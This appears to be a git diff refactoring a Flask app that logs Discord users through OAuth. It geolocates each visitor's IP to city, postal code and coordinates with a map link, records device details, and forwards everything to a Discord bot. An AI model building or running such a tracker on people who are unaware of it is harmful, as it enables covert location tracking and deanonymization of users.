@@ -1,14 +1,12 @@
-# main.py
 import os
 import json
 import threading
-import requests
 from datetime import datetime
 from flask import Flask, request, render_template
 from user_agents import parse
 from dotenv import load_dotenv
-from discord_bot import bot, enqueue_task
 import geoip2.database
+from discord_bot import bot, enqueue_task
 
 load_dotenv()
 app = Flask(__name__)
@@ -17,28 +15,38 @@ ACCESS_LOG_FILE = "access_log.json"
 DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
 DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
-GEOIP_DB_PATH = os.getenv("GEOIP_DB_PATH", "GeoLite2-City.mmdb")  # MaxMind GeoLite2 DB
+DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 
-# =========================
-# IP から正確な位置情報を取得
-# =========================
+GEOIP_DB_PATH = os.getenv("GEOIP_DB_PATH", "GeoLite2-City.mmdb")
+
+# GeoIP2 Reader
+geo_reader = geoip2.database.Reader(GEOIP_DB_PATH)
+
+def get_client_ip():
+    if "X-Forwarded-For" in request.headers:
+        return request.headers["X-Forwarded-For"].split(",")[0].strip()
+    return request.remote_addr
+
 def get_geo_info(ip):
     try:
-        reader = geoip2.database.Reader(GEOIP_DB_PATH)
-        response = reader.city(ip)
-        geo = {
+        response = geo_reader.city(ip)
+        lat = response.location.latitude
+        lon = response.location.longitude
+        region = response.subdivisions.most_specific.name or "不明"
+        city = response.city.name or "不明"
+        postal = response.postal.code or "不明"
+        return {
             "ip": ip,
             "country": response.country.name or "不明",
-            "region": response.subdivisions.most_specific.name or "不明",
-            "city": response.city.name or "不明",
-            "zip": response.postal.code or "不明",
-            "lat": response.location.latitude,
-            "lon": response.location.longitude,
-            "proxy": False,  # MaxMind で判定する場合は追加可能
-            "hosting": False  # MaxMind で判定する場合は追加可能
+            "region": region,
+            "city": city,
+            "zip": postal,
+            "lat": lat,
+            "lon": lon,
+            "map_link": f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else None,
+            "proxy": False,   # GeoIP2 無料DBでは判定不可
+            "hosting": False
         }
-        reader.close()
-        return geo
     except:
         return {
             "ip": ip,
@@ -48,18 +56,11 @@ def get_geo_info(ip):
             "zip": "不明",
             "lat": None,
             "lon": None,
+            "map_link": None,
             "proxy": False,
             "hosting": False
         }
 
-def get_client_ip():
-    if "X-Forwarded-For" in request.headers:
-        return request.headers["X-Forwarded-For"].split(",")[0].strip()
-    return request.remote_addr
-
-# =========================
-# アクセスログ保存
-# =========================
 def save_log(discord_id, data):
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     if os.path.exists(ACCESS_LOG_FILE):
@@ -77,9 +78,6 @@ def save_log(discord_id, data):
     with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
         json.dump(logs, f, indent=4, ensure_ascii=False)
 
-# =========================
-# Flask ルート
-# =========================
 @app.route("/")
 def index():
     discord_auth_url = (
@@ -87,7 +85,6 @@ def index():
         f"&redirect_uri={DISCORD_REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
     )
     return render_template("index.html", discord_auth_url=discord_auth_url)
-
 
 @app.route("/callback")
 def callback():
@@ -128,25 +125,23 @@ def callback():
         "zip": geo["zip"],
         "lat": geo["lat"],
         "lon": geo["lon"],
+        "map_link": geo["map_link"],
         "proxy": geo["proxy"],
+        "hosting": geo["hosting"],
         "browser": f"{ua.browser.family} {ua.browser.version_string}",
         "os": f"{ua.os.family} {ua.os.version_string}",
-        "device": ua.device.family,
-        "map_link": f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}" if geo['lat'] and geo['lon'] else None
+        "device": ua.device.family
     }
 
     save_log(user.get("id"), log_data)
 
-    # Bot にタスク送信
+    # Bot にタスク送信（安全に enqueue）
     enqueue_task(embed_data={"title": "新規アクセス", "description": f"{log_data}"}, user_id=user.get("id"))
 
     return render_template("welcome.html", username=log_data["username"], log=log_data)
 
-# =========================
-# Bot スレッド起動
-# =========================
 def start_bot_thread():
-    threading.Thread(target=lambda: bot.run(os.getenv("DISCORD_BOT_TOKEN")), daemon=True).start()
+    threading.Thread(target=lambda: bot.run(DISCORD_BOT_TOKEN), daemon=True).start()
 
 if __name__ == "__main__":
     start_bot_thread()
